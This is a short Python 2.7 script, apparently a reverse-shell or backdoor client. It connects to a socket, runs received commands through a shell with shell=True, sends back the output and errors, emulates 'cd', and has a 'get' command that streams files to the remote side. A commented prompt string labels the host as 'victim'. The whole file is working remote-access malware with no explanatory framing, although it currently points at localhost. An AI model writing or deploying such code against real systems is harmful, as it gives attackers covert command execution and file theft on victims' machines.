#!/usr/bin/python2.7

### TODO: Add sudo support ...

import os
import re
import socket
import subprocess
import sys

client_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('localhost', int(sys.argv[1])))
print client_socket.getpeername()

OLDPWD=None

def execCmd(cmd):
	communicator=subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True, stdin=subprocess.PIPE)
	return communicator.communicate()

def cd(dir):
	os.chdir(dir)

def download(connection, cmd):
	cmd_split=cmd.split()

	inputFile=cmd_split[1]

	fp=open(inputFile, 'rb')

	for line in fp:
		connection.send(line)
	fp.close()
	connection.send(" "*1024)
	print "Transfer Complete ..."

while True:
	cmd=client_socket.recv(1024).strip()
	# if not cmd:
	# 	client_socket.send("")
	print cmd, "is received ..."

	if "exit" in cmd or "bye" in cmd:
		# client_socket.send("...")
		client_socket.close()
		break

	elif 'get ' in cmd:
		download(client_socket, cmd)
		continue
	# exec_cmd=[]
	# cmd_split=cmd.split(" ")
	# for c in cmd_split:
	# 	exec_cmd.append(c.strip())
	# print exec_cmd
	cd_regex=re.compile("^cd")
	cd_match=cd_regex.match(cmd)


	if cd_match:
		cmd_split=cmd.split()
		print cmd_split

		if len(cmd_split)==1 and cmd_split[0]=="cd":

			CURR_OLD=OLDPWD
			OLDPWD=execCmd("pwd")[0][:-1]

			cd(execCmd("echo $HOME")[0][:-1])

		elif len(cmd_split)==2:

			CURR_OLD=OLDPWD
			OLDPWD=execCmd("pwd")[0][:-1]

			if cmd_split[1]=="~":
				cd(execCmd("echo $HOME")[0][:-1])

			elif cmd_split[1]=="-":
				# print OLDPWD, "is the OLDPWD!"
				if CURR_OLD:
					cd(CURR_OLD)
					output, err=execCmd("pwd")
					if err:
						client_socket.send(err)
				else:
					client_socket.send("/bin/sh: cd: OLDPWD not set")
			else:
				cd(cmd_split[1])
		else:
			(output, err)=execCmd(cmd)
			if err:
				client_socket.send(err)

		client_socket.send(" "*1024)
	else:
		try:
			# communicator=subprocess.Popen(exec_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			(output, err)=execCmd(cmd)
			# print "SENDING output", output, "...", len(output), "and Error", err, "..."
			if err:
				client_socket.send(err)
			# sock.send("HELLO")
			# cmd=raw_input("[shell@victim ~]# ")
			# for data in output:
			# 	if data!=None:
			# 		client_socket.send(data)
			if output and len(output)>0:
				client_socket.send(output)

			client_socket.send(" "*1024)
		except:
			print "Exception Occured!"
			# break
			# pass
			# print "...", cmd, "...", type(cmd), len(cmd)
			# client_socket.send(cmd + " : command not found\n")